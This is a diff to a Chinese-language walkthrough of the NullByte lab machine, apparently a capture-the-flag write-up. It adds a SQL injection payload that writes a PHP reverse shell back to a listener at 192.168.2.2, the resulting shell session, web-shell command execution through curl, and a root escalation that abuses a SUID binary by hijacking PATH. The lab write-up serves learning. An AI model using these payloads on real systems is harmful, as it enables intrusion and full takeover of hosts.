@@ -277,7 +277,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-09 09:50:
 
 -   ![image-20230609100519574](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100519574.png)
 
--   查看当前的库信息，版本信息，用户信息`" union select version(),database(),user() -- `
+-   查看当前的库信息，版本信息，用户信息`" union select version(),database(),user() -- -  `
 
 -   ![image-20230609100723443](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100723443.png)
 
@@ -366,7 +366,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-09 09:50:
 -   读取当前数据库的配置文件,当前sql查询页面`kzMb5nVYJw/420search.php`
 
 -   ```shell
-    ❯ curl http://192.168.2.147/uploads/shell1.php\?cmd\=cat%20/var/www/html/kzMb5nVYJw/420search.php 
+    ❯ curl http://192.168.2.147/uploads/shell.php\?cmd\=cat%20/var/www/html/kzMb5nVYJw/420search.php 
     1       ramses
     2       isis    employee
     <?php
@@ -409,6 +409,43 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-09 09:50:
 ### sql注入3
 
 通过sql注入直接写入大马，写入到`/uploads/`文件夹下。
+
+```SHELL
+" union select "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.2/1234 0>&1 '\"); ?>","","" into outfile "/var/www/html/uploads/sh.php"; -- - 
+```
+
+- 在本机开启监听，访问上传点获得初始shell
+
+- ```SHELL
+  └─$ nc -nvlp 1234
+  listening on [any] 1234 ...
+  connect to [192.168.2.2] from (UNKNOWN) [192.168.2.3] 42151
+  bash: cannot set terminal process group (574): Inappropriate ioctl for device
+  bash: no job control in this shell
+  www-data@NullByte:/var/www/html/uploads$ whoami
+  whoami
+  www-data
+  www-data@NullByte:/var/www/html/uploads$ ip a
+  ip a
+  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+      inet 127.0.0.1/8 scope host lo
+         valid_lft forever preferred_lft forever
+      inet6 ::1/128 scope host 
+         valid_lft forever preferred_lft forever
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+      link/ether 00:0c:29:98:28:e2 brd ff:ff:ff:ff:ff:ff
+      inet 192.168.2.3/24 brd 192.168.2.255 scope global eth0
+         valid_lft forever preferred_lft forever
+      inet6 fe80::20c:29ff:fe98:28e2/64 scope link 
+         valid_lft forever preferred_lft forever
+  www-data@NullByte:/var/www/html/uploads$ uname -a
+  uname -a
+  Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
+  www-data@NullByte:/var/www/html/uploads$    
+  ```
+
+- 
 
 ## 获取初始权限
 
@@ -511,5 +548,46 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-09 09:50:
     sudo -l
     exit
     ```
+
+- 在`/var/www/html`文件夹下存在一个可执行文件，该文件存在`suid`权限，尝试执行该命令后发现执行了两个指令。
+
+- ```shell
+  ramses@NullByte:/var/www/backup$ ls -lhai
+  total 20K
+  401863 drwxrwxrwx 2 root root 4.0K Aug  2  2015 .
+  389537 drwxr-xr-x 4 root root 4.0K Aug  2  2015 ..
+  391947 -rwsr-xr-x 1 root root 4.9K Aug  2  2015 procwatch
+  401064 -rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
+  ramses@NullByte:/var/www/backup$ ./procwatch 
+    PID TTY          TIME CMD
+  20452 pts/0    00:00:00 procwatch
+  20453 pts/0    00:00:00 sh
+  20454 pts/0    00:00:00 ps
+  ramses@NullByte:/var/www/backup$ 
+  ```
+
+- 使用软链接将`/bin/sh`连接到ps中，并添加当前路径，由于文件具有`suid`权限，所以在执行这一步后会获得`root`权限
+
+- ```shell
+  ramses@NullByte:/var/www/backup$ ./procwatch 
+  # whoami
+  root
+  # uname -a
+  Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
+  # ip a
+  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+      inet 127.0.0.1/8 scope host lo
+         valid_lft forever preferred_lft forever
+      inet6 ::1/128 scope host 
+         valid_lft forever preferred_lft forever
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+      link/ether 00:0c:29:98:28:e2 brd ff:ff:ff:ff:ff:ff
+      inet 192.168.2.3/24 brd 192.168.2.255 scope global eth0
+         valid_lft forever preferred_lft forever
+      inet6 fe80::20c:29ff:fe98:28e2/64 scope link 
+         valid_lft forever preferred_lft forever
+  #
+  ```
 
 -   
